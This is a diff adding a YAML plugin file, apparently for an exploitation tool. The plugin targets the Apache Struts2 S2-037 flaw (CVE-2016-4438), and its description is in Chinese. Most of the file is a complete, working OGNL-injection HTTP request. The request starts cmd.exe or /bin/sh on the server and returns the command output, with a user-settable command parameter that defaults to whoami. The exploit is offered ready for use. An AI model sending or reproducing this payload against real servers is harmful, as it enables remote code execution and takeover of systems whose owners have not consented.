@@ -1,0 +1,33 @@
+info:
+    app: Struts2
+    name: S2_037
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2016-06-20"
+    create_date: "2024-10-06 12:41:46"
+    update_date: "2024-10-06 12:41:46"
+    scope: Struts 2.3.20 - Struts Struts 2.3.28.1
+    description: 当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式。
+    vul_id: CVE-2016-4438
+    detail: |
+        利用点为URI
+        目前只支持cmd
+        URL如http://192.168.111.129:8080/orders/4/
+        http://struts.apache.org/docs/s2-037.html
+    payload: |+
+        GET /orders/4//(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23a%3D%23parameters.reqobj%5B0%5D%2C%23c%3D%23parameters.reqobj%5B1%5D%2C%23req%3D%23context.get(%23a)%2C%23hh%3D%23context.get(%23parameters.rpsobj%5B0%5D)%2C%23osname%3D%40java.lang.System%40getProperty(%23parameters.os_name)%2C%23list%3D%23osname.startsWith(%23parameters.windows)%3Fnew%20java.lang.String%5B%5D%7B%23parameters.cmdexe%2C%23parameters.ccc_c%2C%23parameters.cmd%7D%3Anew%20java.lang.String%5B%5D%7B%23parameters.binbash%2C%23parameters.ccc%2C%23parameters.cmd%7D%2C%23aa%3D(new%20java.lang.ProcessBuilder(%23list)).start()%2C%23bb%3D%23aa.getInputStream()%2C%23hh.getWriter().println(new%20java.lang.String(new%20org.apache.commons.io.IOUtils().toByteArray(%23bb)%2C%23parameters.gbk))%2C%23hh.getWriter().flush()%2C%23hh.getWriter().close())%3AtoString.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=/&cmd=whoami&reqobj=struts.txt&content=fb98ab9159f51fd0&os_name=os.name&windows=Windows&binbash=/bin/sh&ccc=-c&cmdexe=cmd.exe&ccc_c=/c&gbk=iso-8859-1 HTTP/1.1
+        Host: 192.168.111.129:8080
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+payloads:
+    - name: cmd1
+      alias: 命令执行1
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
